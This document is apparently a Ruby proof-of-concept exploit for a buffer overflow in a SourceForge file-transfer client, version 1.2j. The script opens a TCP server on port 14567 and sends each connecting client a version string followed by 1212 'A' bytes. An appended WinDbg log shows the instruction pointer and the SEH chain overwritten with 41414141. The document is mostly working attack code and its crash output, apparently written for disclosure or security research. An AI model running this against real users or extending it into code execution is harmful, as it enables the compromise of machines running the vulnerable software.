#!/usr/bin/env ruby
# http://file-transfer.sourceforge.net/
# Version 1.2j 
# Version Buffer Overflow.
 

require 'rex'
require 'socket'

#buff = "A" * 1180
buff = "A" * 1212


server = TCPServer.new 14567

1.upto(2) do
  client =  server.accept
  client.write("\x31\x2e\x32\x6a" + buff)
end
__END__
(c54.e40): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=76eb660d esi=00000000 edi=00000000
eip=41414141 esp=02dff340 ebp=02dff360 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
0:006> !exchain
02dff354: ntdll!ExecuteHandler2+3a (76eb660d)
02dff834: image00400000+5c2b8 (0045c2b8)
02dffde4: 41414141
Invalid exception stack at 41414141
0:006> !nmod
00400000 00487000 image00400000        /SafeSEH ON  /GS            image00400000
